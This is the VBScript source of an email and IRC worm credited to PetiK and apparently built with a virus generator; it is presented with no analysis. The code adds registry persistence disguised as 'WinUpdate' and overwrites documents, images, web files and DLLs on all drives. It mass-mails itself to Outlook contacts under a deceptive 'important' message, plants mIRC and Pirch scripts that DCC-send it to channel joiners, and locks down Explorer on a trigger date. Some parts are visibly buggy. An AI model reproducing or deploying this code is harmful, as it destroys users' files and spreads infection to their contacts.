   'EMM
   'writen by PetiK
   'Generated with antigam by sevenC / N0:7
   on error resume next
   Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder , STRINGMAN
   Set fso = createobject("scripting.filesystemobject")
   TNI = fso.getspecialfolder(0)
   GAM = TNI & "\system.vbs"
   Set MEGAWATI = createobject("wscript.shell")
   MEGAWATI.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & GAM & " %"
   fso.copyfile wscript.scriptfullname, GAM
   STRINGMAN = "infected with EMM by PetiK"
   Set Drives=fso.drives
   For Each Drive in Drives
   If drive.isready then
   Dosearch drive
   end If
   Next

   function Dosearch(path)
   on error resume next
   Set Folder=fso.getfolder(path)
   Set Files = folder.files
   For Each File in files
   If fso.GetExtensionName(file.path)="htm" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="html" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="js" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="dll" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="ini" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="php" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="bat" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="jsp" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="txt" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="mp3" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="asp" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="doc" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="asp" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="jpg" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   If fso.GetExtensionName(file.path)="gif" then
   on error resume next
   set drop = fso.createtextfile(File.path)
   drop.writeline stringman
   drop.close
   end if
   next
   Set Subfolders = folder.SubFolders
   For Each Subfolder in Subfolders
   Dosearch Subfolder.path
   Next
   end function

   'antigam payload by PetiK
   If month(now) = 9 and day(now) = 19 then
   MEGAWATI.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
   MEGAWATI.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
   MEGAWATI.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
   MEGAWATI.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
   MEGAWATI.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
   end if

   if day(now) <> 19 then
   ANTIGAM1
   end if

   if day(now) <> 19 then
   ANTIGAM2
   end if

   if day(now) <> 19 then
   ANTIGAM3
   end if

   FUNCTION ANTIGAM1()
   if month(now) <> 9 then
   sevenvsvx1
   end if
   end function

   FUNCTION ANTIGAM2()
   if month(now) <> 9 then
   sevenvsvx2
   end if
   end function

   FUNCTION ANTIGAM3()
   if month(now) <> 9 then
   sevenvsvx3
   end if
   end function

   FUNCTION sevenvsvx1()
   if month(now) <> 9 then
   WW32145
   end if
   end function

   FUNCTION sevenvsvx2()
   if month(now) <> 9 then
   LOGHARYTHM1Z
   end if
   end function

   FUNCTION sevenvsvx2()
   if month(now) <> 9 then
   SEVENDUST
   end if
   end function

   Function WW32145()
   Set HK6Q2788 = CreateObject("Outlook.Application")
   If HK6Q2788 = "Outlook" Then
   Set LFD818HB = HK6Q2788.GetNameSpace("MAPI")
   Set MS97DFA0 = LFD818HB.AddressLists
   For Each I6166352 In MS97DFA0
   If I6166352.AddressEntries.Count <> 0 Then
   CFJ3AVGM = I6166352.AddressEntries.Count
   For G2T0QB76 = 1 To CFJ3AVGM
   Set UF0MVV64 = HK6Q2788.CreateItem(0)
   Set RHR543O8 = I6166352.AddressEntries(G2T0QB76)
   UF0MVV64.To = RHR543O8.Address
   UF0MVV64.Subject = "Verry Important...!!"
   UF0MVV64.Body = "Hii.." & vbcrlf & "Please view this file, it's very important to help my country" & vbcrlf & ""
   execute "set SG63KH0F =UF0MVV64." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
   I2512RET = V2F5FODG
   UF0MVV64.DeleteAfterSubmit = True
   SG63KH0F.Add I2512RET
   If UF0MVV64.To <> "" Then
   UF0MVV64.Send
   End If
   Next
   End If
   Next
   End If
   End function

   function LOGHARYTHM1Z()
   If N0WARFORIRAK <> "" then
   FRS46KB8 = MEGAWATI.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If fso.fileexists("c:\mirc\mirc.ini") then
   N0WARFORIRAK = "c:\mirc"
   ElseIf fso.fileexists("c:\mirc32\mirc.ini") Then
   N0WARFORIRAK = "c:\mirc"
   ElseIf fso.fileexists(FRS46KB8 & "\mirc\mirc.ini") Then
   N0WARFORIRAK = FRS46KB8 & "\mirc"
   ElseIf fso.fileexists(FRS46KB8 & "\mirc32\mirc.ini") Then
   N0WARFORIRAK = FRS46KB8 & "\mirc"
   Else
   N0WARFORIRAK = ""
   End If
   End If
   If N0WARFORIRAK <> "" Then
   Set ANTIUSA = fso.CreateTextFile(N0WARFORIRAK & "\script.ini", True)
   ANTIUSA = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
   ANTIUSA = ANTIUSA & vbCrLf & "n0=on 1:JOIN:#:{"
   ANTIUSA = ANTIUSA & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
   ANTIUSA = ANTIUSA & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
   ANTIUSA = ANTIUSA & GAM
   ANTIUSA = ANTIUSA & vbCrLf & "n3=}"
   script.Close
   End If
   End Function

   function SEVENDUST()
   If THEASSH0L3 <> "" then
   FRS46KB8 = MEGAWATI.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If fso.fileexists("C:\Pirch98\events.ini") then
   THEASSH0L3 = "C:\Pirch98"
   ElseIf fso.fileexists(FRS46KB8 & "\Pirch98\events.ini") Then
   BIP78A4V = FRS46KB8 & "\Pirch98"
   else
   THEASSH0L3 = ""
   END IF
   END IF
   If THEASSH0L3 <> "" then
   Set MB534QR6 = fso.CreateTextFile(THEASSH0L3 & "\script.ini", True)
   MB534QR6.writeline "[Levels]"
   MB534QR6.writeline "Enabled=1"
   MB534QR6.writeline "Count=6"
   MB534QR6.writeline "Level1=000-Unknows"
   MB534QR6.writeline "000-UnknowsEnabled=1"
   MB534QR6.writeline "Level2=100-Level 100"
   MB534QR6.writeline "100-Level 100Enabled=1"
   MB534QR6.writeline "Level3=200-Level 200"
   MB534QR6.writeline "200-Level 200Enabled=1"
   MB534QR6.writeline "Level4=300-Level 300"
   MB534QR6.writeline "300-Level 300Enabled=1"
   MB534QR6.writeline "Level5=400-Level 400"
   MB534QR6.writeline "400-Level 400Enabled=1"
   MB534QR6.writeline "Level6=500-Level 500"
   MB534QR6.writeline "500-Level 500Enabled=1"
   MB534QR6.writeline "[000-Unknowns]"
   MB534QR6.writeline "User1=*!*@*"
   MB534QR6.writeline "UserCount=1"
   MB534QR6.writeline "Events1= ON JOIN:#: /dcc send $nick " & GAM
   MB534QR6.writeline "EventCount=1"
   MB534QR6.writeline "[100-Level 100]"
   MB534QR6.writeline "UserCount=0"
   MB534QR6.writeline "EventCount=0"
   MB534QR6.writeline "[200-Level 200]"
   MB534QR6.writeline "UserCount=0"
   MB534QR6.writeline "EventCount=0"
   MB534QR6.writeline "[300-Level 300]"
   MB534QR6.writeline "UserCount=0"
   MB534QR6.writeline "EventCount=0"
   MB534QR6.writeline "[400-Level 400]"
   MB534QR6.writeline "UserCount=0"
   MB534QR6.writeline "EventCount=0"
   MB534QR6.writeline "[500-Level 500]"
   MB534QR6.writeline "UserCount=0"
   MB534QR6.writeline "EventCount=0"
   END IF
   end function

   Function J242F5FO()
   On Error Resume Next
   Set DR1805NB = fso.Drives
   For Each O81U5MK0 In DR1805NB
   H4GB3D1J = O81U5MK0 & " \ "
   Call E2D8VU73(H4GB3D1J)
   Next
   End Function
   Function E2D8VU73(LEDKTM5D)
   CV757O21 = LEDKTM5D
   Set BSID3GF6 = fso.GetFolder(CV757O21)
   Set GOM9KI8K = BSID3GF6.Files
   For Each OM28U374 In GOM9KI8K
   If lcase(OM28U374.Name) = "mirc.ini" Then
   LOGHARYTHM1Z(OM28U374.ParentFolder)
   End If
   If fso.GetExtensionName(OM28U374.path) = "vbs" then
   fso.CopyFile wscript.scriptfullname,OM28U374.path,true
   End if
   If fso.GetExtensionName(OM28U374.path) = "vbe" then
   fso.CopyFile wscript.scriptfullname,OM28U374.path,true
   End if
   Next
   Set L7QK6Q27 = BSID3GF6.Subfolders
   For Each LN4FD818 In L7QK6Q27
   Call (LN4FD818.path)
   Next
   End function

   'AntiDeletion function
   'From [K]alamar
   Set Kalamar = fso.opentextfile(wscript.scriptfullname)
   sevenC = Kalamar.readall
   Kalamar.close
   Do
   if not(fso.fileexists(wscript.scriptfullname)) then
   set ANTISCRIPT= fso.createtextfile(wscript.scriptfullname)
   ANTISCRIPT.write sevenC
   ANTISCRIPT.close
   end if
   KALAMAR2 = MEGAWATI.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate)
   If KALAMAR2 <> "wscript.exe" & GAM & " %" then
   MEGAWATI.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe" & GAM & " %"
   end if
   KALAMAR2= ""
   loop

   'EMM by PetiK
   'Generated with antigam by sevenC / N0:7
   'http://trax.to/sevenC
   'sevenC_zone@yahoo.com

   '-------EMM--------
   '-------PetiK--------
